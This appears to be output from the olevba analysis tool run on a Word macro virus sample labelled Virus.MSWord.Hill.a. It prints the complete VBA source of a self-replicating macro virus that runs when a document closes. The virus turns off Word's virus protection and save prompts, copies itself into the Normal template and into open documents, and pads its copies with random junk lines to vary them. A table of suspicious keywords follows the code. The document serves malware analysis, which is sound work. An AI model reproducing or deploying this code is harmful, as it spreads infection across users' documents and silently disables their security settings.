olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hill.a-77ff399dc0017339c90eb5a47a14587b9ee784f3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hill.a-77ff399dc0017339c90eb5a47a14587b9ee784f3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Hill.a-77ff399dc0017339c90eb5a47a14587b9ee784f3 - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'mountain
Private Sub Document_Close()
Dim j
   On Error Resume Next
   'Macro.Word97.Mountain by Duke/SMF
   Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
   Options.VirusProtection = False
   Options.ConfirmConversions = False
   Options.SaveNormalPrompt = False
   j = 1
   Randomize
   If NT.Lines(1, 1) <> "'mountain" Then
      For i = 1 To AD.CountOfLines
         NT.InsertLines j, AD.Lines(i, 1)
         j = j + 1
         Ex = Mid(AD.Lines(i, 1), 1, 1)
         If Ex = Asc(" ") Then MountainNT
      Next
   End If
   If AD.Lines(1, 1) <> "'mountain" Then
      For i = 1 To NT.CountOfLines
         AD.InsertLines i, NT.Lines(i, 1)
         j = j + 1
         Ex = Mid(NT.Lines(i, 1), 1, 1)
         If Ex = Asc(" ") Then MountainAD
      Next
   End If
End Sub
Function MountainNT()
   R = Rnd
   If R < 1 And R > 0.08 Then
      NT.InsertLines j, " S = " + Chr(34) + Gener + Chr(34)
   End If
   If R < 0.08 And R > 0.05 Then
      NT.InsertLines j, " '" + Gener
   End If
   If R < 0.05 And R > 0.03 Then
      NT.InsertLines j, "  "
   End If
   If R > 0.03 Then j = j + 1
End Function
Function MountainAD()
   R = Rnd
   If R < 1 And R > 0.08 Then
      AD.InsertLines j, " S = " + Chr(34) + Gener + Chr(34)
   End If
   If R < 0.08 And R > 0.05 Then
      AD.InsertLines j, " '" + Gener
   End If
   If R < 0.05 And R > 0.03 Then
      AD.InsertLines j, "  "
   End If
   If R > 0.03 Then j = j + 1
End Function
Function Gener()
   Gener = ""
   For i = 1 To Int(20 * Rnd + 1)
      Gener = Gener + Chr(Int(128 * Rnd + 48))
   Next
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

